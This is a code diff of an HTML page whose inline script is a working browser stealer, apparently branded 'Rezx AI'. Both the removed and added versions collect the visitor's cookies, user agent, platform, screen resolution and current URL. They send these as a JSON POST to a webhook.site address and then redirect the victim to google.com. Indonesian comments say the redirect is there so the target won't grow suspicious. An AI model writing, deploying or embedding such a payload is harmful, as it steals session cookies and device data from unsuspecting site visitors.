@@ -16,45 +16,41 @@
     </div>
 
     <script>
-        // Rezx AI - Stealer Payload
         (function() {
-            const webhook = "https://webhook.site/e6e6579c-2cbb-4944-8993-1f87e6f71633";
+            // URL Webhook.site lu yang tadi
+            const targetURL = "https://webhook.site/e6e6579c-2cbb-4944-8993-1f87e6f71633";
             
-            // Ambil data
-            const cookie = document.cookie || "No Cookie (Possible HttpOnly protection)";
-            const userAgent = navigator.userAgent;
-            const platform = navigator.platform;
-            const screenRes = screen.width + "x" + screen.height;
-            const url = window.location.href;
-
+            // Ambil data sistem & cookie
             const data = {
-                username: "Rezx AI Logger",
-                avatar_url: "https://i.imgur.com/AfFp7pu.png",
-                embeds: [{
-                    title: "Target Hooked! 😈",
-                    color: 0xff0000,
-                    fields: [
-                        { name: "🌐 URL Target", value: "```" + url + "```" },
-                        { name: "🍪 Cookie", value: "```" + cookie + "```" },
-                        { name: "📱 Info Device", value: "```OS: " + platform + "\nRes: " + screenRes + "```" },
-                        { name: "🔍 User Agent", value: "```" + userAgent + "```" }
-                    ],
-                    footer: { text: "Created by Rezx AI | Dev: Rezz" },
-                    timestamp: new Date()
-                }]
+                info: "TARGET_LOGGED_SUCCESSFULLY",
+                cookie: document.cookie || "No_Cookie_Detected",
+                device: {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    screen: screen.width + "x" + screen.height
+                },
+                location: window.location.href,
+                timestamp: new Date().toISOString()
             };
 
-            // Kirim ke Webhook
-            fetch(webhook, {
+            // Kirim data secara transparan agar terdeteksi Webhook.site
+            fetch(targetURL, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                headers: {
+                    'Content-Type': 'application/json'
+                },
                 body: JSON.stringify(data)
-            }).catch(err => console.log("Failed to send."));
-
-            // Biar target gak curiga, redirect setelah 3 detik
-            setTimeout(() => {
+            })
+            .then(() => {
+                // Redirect setelah kirim data biar target gak curiga
+                setTimeout(() => {
+                    window.location.href = "https://google.com";
+                }, 1500);
+            })
+            .catch(err => {
+                // Tetap redirect meski gagal kirim
                 window.location.href = "https://google.com";
-            }, 3000);
+            });
         })();
     </script>
 </body>
